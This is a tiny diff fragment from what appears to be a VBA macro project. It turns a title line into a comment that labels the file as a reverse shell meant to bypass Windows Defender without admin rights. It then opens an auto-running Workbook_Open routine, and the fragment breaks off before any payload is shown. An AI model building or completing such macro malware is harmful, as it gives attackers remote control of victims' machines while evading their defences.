@@ -1,4 +1,4 @@
-Simple vba reverse shell that bypass Windows Defender without admin rights
+' Simple vba reverse shell that bypass Windows Defender without admin rights, thanks to @lurto for the vba reverse shell
 
 Private Sub Workbook_Open()
 '
